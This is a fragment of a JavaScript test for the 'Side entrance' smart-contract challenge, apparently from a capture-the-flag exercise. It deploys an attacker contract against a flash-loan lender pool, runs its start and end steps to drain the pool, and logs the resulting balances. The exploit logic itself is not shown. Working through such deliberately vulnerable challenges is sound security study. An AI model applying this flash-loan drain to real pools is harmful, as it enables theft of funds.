...
describe("[Challenge] Side entrance", function () {
  ...
  it("Execution", async function () {
    ...
    let testFlashloanSideEntranceLenderPool = await (
      await ethers.getContractFactory(
        "testFlashloanSideEntranceLenderPool",
        deployer
      )
    ).deploy(pool.address, player.address);
    await testFlashloanSideEntranceLenderPool.start();
    await testFlashloanSideEntranceLenderPool.end();

    let b = await ethers.provider.getBalance(
      testFlashloanSideEntranceLenderPool.address
    );
    console.log("testFlashloan balance", b.toString());
    b = await ethers.provider.getBalance(pool.address);
